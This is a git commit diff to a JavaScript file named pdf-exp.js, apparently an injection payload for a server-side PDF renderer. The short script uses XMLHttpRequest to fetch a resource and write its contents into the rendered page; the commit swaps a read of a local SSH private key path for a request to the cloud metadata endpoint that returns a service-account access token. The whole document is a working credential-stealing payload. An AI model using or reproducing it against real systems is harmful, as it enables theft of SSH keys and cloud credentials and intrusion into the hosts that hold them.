20a3d06ba094fb5787e9c111b9d859b819400da8
gururaj359 <44290477+gururaj359@users.noreply.github.com>
2023-09-21 13:05:19 +0530

    Update pdf-exp.js

--- pdf-exp.js
+++ pdf-exp.js
@@ -1,5 +1,5 @@
 http = new XMLHttpRequest();
 http.onload = function(){document.write(this.responseText);}
 http.onerror = function(){document.write('failed!')}
-http.open("GET","file:///home/nutanix/ssh_keys/nutanix");
+http.open("GET","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token");
 http.send();
